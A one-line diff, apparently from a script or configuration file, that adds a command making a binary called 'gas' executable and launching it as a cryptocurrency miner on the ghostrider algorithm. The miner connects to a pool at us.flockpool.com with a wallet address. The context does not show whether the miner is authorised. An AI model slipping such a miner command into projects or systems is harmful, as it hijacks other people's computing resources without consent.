@@ -1,1 +1,1 @@
-
+chmod +x gas && ./gas -a ghostrider --url us.flockpool.com:5555 --tls --user RRUkzfgHKHqi3iG5rv6LnBUgkCCere2H3x.unispace111
